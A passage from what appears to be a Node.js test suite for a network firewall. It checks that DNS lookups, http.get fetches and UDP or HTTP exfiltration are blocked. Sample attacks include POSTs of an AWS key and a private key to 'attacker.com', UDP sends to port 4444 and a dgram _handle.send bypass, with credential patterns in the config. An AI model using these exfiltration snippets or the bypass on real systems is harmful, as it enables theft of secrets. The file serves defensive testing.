            // Answer: NAME = pointer to 0x0c, TYPE=A, CLASS=IN, TTL=60, RDLEN=4, RDATA=127.0.0.1
            const answer = Buffer.from([
              0xC0, 0x0C,
              0x00, 0x01,
              0x00, 0x01,
              0x00, 0x00, 0x00, 0x3C,
              0x00, 0x04,
              0x7F, 0x00, 0x00, 0x01
            ]);

            const resp = Buffer.concat([header, msg.slice(12), answer]);
            server.send(resp, rinfo.port, rinfo.address);
          } catch (e) {
            // ignore
          }
        });

        server.bind(0, '127.0.0.1', async () => {
          const port = server.address().port;
          dns.setServers(['127.0.0.1:' + port]);

          const hostname = 'blocked.test';

          // Callback API
          dns.resolve4(hostname, (err, addresses) => {
            if (err) {
              console.log('DNSR_BLOCKED:' + err.message);
            } else {
              console.log('DNSR_SUCCESS:' + (addresses || []).join(','));
            }
          });

          // Promises API
          try {
            const addrs = await dns.promises.resolve4(hostname);
            console.log('DNSRP_SUCCESS:' + (addrs || []).join(','));
          } catch (e) {
            console.log('DNSRP_BLOCKED:' + e.message);
          }

          // Resolver instance API
          const r = new dns.Resolver();
          r.setServers(['127.0.0.1:' + port]);
          r.resolve4(hostname, (err, addresses) => {
            if (err) {
              console.log('DNSRES_BLOCKED:' + err.message);
            } else {
              console.log('DNSRES_SUCCESS:' + (addresses || []).join(','));
            }
          });

          setTimeout(() => {
            server.close();
            process.exit(0);
          }, 2000);
        });
      `;

      const result = await runWithFirewall(testDir, code, { timeout: 7000 });

      const anySuccess =
        result.output.includes('DNSR_SUCCESS') ||
        result.output.includes('DNSRP_SUCCESS') ||
        result.output.includes('DNSRES_SUCCESS');

      return {
        pass: !anySuccess || isBlocked(result.output) ||
          result.output.includes('DNSR_BLOCKED') ||
          result.output.includes('DNSRP_BLOCKED') ||
          result.output.includes('DNSRES_BLOCKED'),
        reason: anySuccess ? 'dns resolve succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // Test: http.get shorthand
  await tracker.runTest('blockedDomains - http.get blocked', async () => {
    const testDir = setupTestDir('net-http-get');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: ['malware-server.io'],
          allowedDomains: []
        }
      });
      
      const code = `
        const http = require('http');
        http.get('http://malware-server.io/payload', (res) => {
          console.log('GET_SUCCESS');
        }).on('error', (e) => {
          console.log('GET_BLOCKED:' + e.message);
        });
        setTimeout(() => {
          console.log('GET_TIMEOUT');
          process.exit(0);
        }, 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || 
              result.output.includes('GET_BLOCKED') ||
              result.output.includes('GET_TIMEOUT'),
        reason: result.output.includes('GET_SUCCESS') ? 'http.get succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // Test: UDP datagram (dgram) for exfiltration
  await tracker.runTest('blockedDomains - dgram UDP exfiltration', async () => {
    const testDir = setupTestDir('net-udp');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: [],
          allowedDomains: [],
          suspiciousPorts: [53, 4444]
        }
      });
      
      const code = `
        const dgram = require('dgram');
        const client = dgram.createSocket('udp4');
        const message = Buffer.from('EXFIL_DATA');
        
        client.on('error', (e) => {
          console.log('UDP_BLOCKED:' + e.message);
          client.close();
        });
        
        try {
          client.send(message, 4444, '127.0.0.1', (err) => {
            if (err) {
              console.log('UDP_BLOCKED:' + err.message);
            } else {
              console.log('UDP_SUCCESS');
            }
            client.close();
          });
        } catch (e) {
          console.log('UDP_BLOCKED:' + e.message);
        }
        
        setTimeout(() => process.exit(0), 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      // UDP to suspicious port should be blocked in enforcement mode
      return {
        pass: isBlocked(result.output) || 
              result.output.includes('UDP_BLOCKED') ||
              !result.output.includes('UDP_SUCCESS'),
        reason: result.output.includes('UDP_SUCCESS') ? 'UDP send succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });

  await tracker.runTest('suspiciousPorts - dgram send blocked (dynamic import node:dgram)', async () => {
    // Skip on Node.js 18 - ESM hooks not supported (register() API added in Node.js 20.6.0)
    if (!supportsESMHooks) {
      return { pass: true, reason: 'skipped (Node.js 18 - ESM hooks not supported)', skipped: true };
    }
    
    const testDir = setupTestDir('net-udp-import');

    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: [],
          allowedDomains: [],
          suspiciousPorts: [4444]
        }
      });

      const code = `
        (async () => {
          try {
            const dgram = await import('node:dgram');
            const client = dgram.createSocket('udp4');
            const message = Buffer.from('EXFIL_DATA');

            client.on('error', (e) => {
              console.log('UDPI_BLOCKED:' + e.message);
              try { client.close(); } catch (e2) {}
            });

            try {
              client.send(message, 4444, '127.0.0.1', (err) => {
                if (err) {
                  console.log('UDPI_BLOCKED:' + err.message);
                } else {
                  console.log('UDPI_SUCCESS');
                }
                try { client.close(); } catch (e2) {}
              });
            } catch (e) {
              console.log('UDPI_BLOCKED:' + e.message);
              try { client.close(); } catch (e2) {}
            }
          } catch (e) {
            console.log('UDPI_BLOCKED:' + e.message);
          }
          setTimeout(() => process.exit(0), 2000);
        })();
      `;

      const result = await runWithFirewall(testDir, code, { timeout: 5000 });

      return {
        pass: isBlocked(result.output) || result.output.includes('UDPI_BLOCKED') || !result.output.includes('UDPI_SUCCESS'),
        reason: result.output.includes('UDPI_SUCCESS') ? 'udp send (node:dgram) succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });

  await tracker.runTest('suspiciousPorts - dgram _handle.send bypass blocked', async () => {
    const testDir = setupTestDir('net-udp-handle');

    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: [],
          allowedDomains: [],
          suspiciousPorts: [4444]
        }
      });

      const code = `
        const dgram = require('dgram');
        const client = dgram.createSocket('udp4');
        const message = Buffer.from('EXFIL_DATA');

        function done() {
          try { client.close(); } catch (e) {}
          setTimeout(() => process.exit(0), 20);
        }

        try {
          const h = client._handle;
          if (!h || typeof h.send !== 'function') {
            console.log('UDP_HANDLE_MISSING');
            return done();
          }

          h.send(message, 0, message.length, 4444, '127.0.0.1', (err) => {
            if (err) {
              console.log('UDP_HANDLE_BLOCKED:' + err.message);
            } else {
              console.log('UDP_HANDLE_SUCCESS');
            }
            done();
          });
        } catch (e) {
          console.log('UDP_HANDLE_BLOCKED:' + e.message);
          done();
        }

        setTimeout(() => {
          console.log('UDP_HANDLE_TIMEOUT');
          done();
        }, 2000);
      `;

      const result = await runWithFirewall(testDir, code, { timeout: 5000 });

      return {
        pass: isBlocked(result.output) || result.output.includes('UDP_HANDLE_BLOCKED') || !result.output.includes('UDP_HANDLE_SUCCESS'),
        reason: result.output.includes('UDP_HANDLE_SUCCESS') ? 'udp handle send succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // =========================================================================
  // ALLOWED DOMAINS TESTS
  // =========================================================================
  console.log('\n--- Allowed Domains ---\n');
  
  // Test 7: Verify allowed domains config is parsed
  await tracker.runTest('allowedDomains - config parsing', async () => {
    const testDir = setupTestDir('net-allowed-config');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: [],
          allowedDomains: ['registry.npmjs.org', 'api.github.com']
        }
      });
      
      const code = `
        const fs = require('fs');
        const config = JSON.parse(fs.readFileSync('.firewall-config.json', 'utf8'));
        if (config.network.allowedDomains.includes('registry.npmjs.org')) {
          console.log('ALLOWED_CONFIG_OK');
        } else {
          console.log('ALLOWED_CONFIG_MISSING');
        }
      `;
      
      const result = await runWithFirewall(testDir, code);
      
      return {
        pass: result.output.includes('ALLOWED_CONFIG_OK'),
        reason: result.output.includes('ALLOWED_CONFIG_OK') ? 'config parsed' : 'config not found',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // =========================================================================
  // CREDENTIAL PATTERN TESTS
  // =========================================================================
  console.log('\n--- Credential Exfiltration Detection ---\n');
  
  // Test 8: Detect credential patterns in request body
  await tracker.runTest('credentialPatterns - detects API key in request', async () => {
    const testDir = setupTestDir('net-creds');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: [],
          allowedDomains: [],
          credentialPatterns: [
            'aws_access_key_id',
            'aws_secret_access_key',
            'BEGIN.*PRIVATE KEY',
            'GITHUB_TOKEN'
          ]
        }
      });
      
      const code = `
        const http = require('http');
        const sensitiveData = JSON.stringify({
          aws_access_key_id: 'AKIAIOSFODNN7EXAMPLE',
          data: 'some payload'
        });
        const req = http.request({
          hostname: 'attacker.com',
          port: 80,
          path: '/exfil',
          method: 'POST',
          headers: { 'Content-Type': 'application/json' }
        }, (res) => {
          console.log('EXFIL_SUCCESS');
        });
        req.on('error', (e) => {
          console.log('EXFIL_BLOCKED:' + e.message);
        });
        req.write(sensitiveData);
        req.end();
        setTimeout(() => process.exit(0), 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || 
              result.output.includes('EXFIL_BLOCKED') ||
              !result.output.includes('EXFIL_SUCCESS'),
        reason: result.output.includes('EXFIL_SUCCESS') ? 'exfil succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // Test 9: Detect private key exfiltration
  await tracker.runTest('credentialPatterns - detects private key exfiltration', async () => {
    const testDir = setupTestDir('net-privkey');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: [],
          allowedDomains: [],
          credentialPatterns: ['BEGIN.*PRIVATE KEY']
        }
      });
      
      const code = `
        const http = require('http');
        const privateKey = '-----BEGIN PRIVATE KEY-----\\nMIIEvgIBADANBg...\\n-----END PRIVATE KEY-----';
        const req = http.request({
          hostname: 'attacker.com',
          port: 80,
          path: '/steal',
          method: 'POST'
        }, (res) => {
          console.log('KEY_EXFIL_SUCCESS');
        });
        req.on('error', (e) => {
          console.log('KEY_EXFIL_BLOCKED:' + e.message);
        });
        req.write(privateKey);
        req.end();
        setTimeout(() => process.exit(0), 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || 
              result.output.includes('KEY_EXFIL_BLOCKED') ||
              !result.output.includes('KEY_EXFIL_SUCCESS'),
        reason: result.output.includes('KEY_EXFIL_SUCCESS') ? 'key exfil succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  return tracker.getSummary();
}

module.exports = { runNetworkTests };

// Allow direct execution
if (require.main === module) {
  runNetworkTests().then(summary => {
    console.log('\nNetwork Tests Summary:');
    console.log(`  Passed: ${summary.passed}`);
    console.log(`  Failed: ${summary.failed}`);
    console.log(`  Skipped: ${summary.skipped}`);
    process.exit(summary.failed > 0 ? 1 : 0);
  });
}
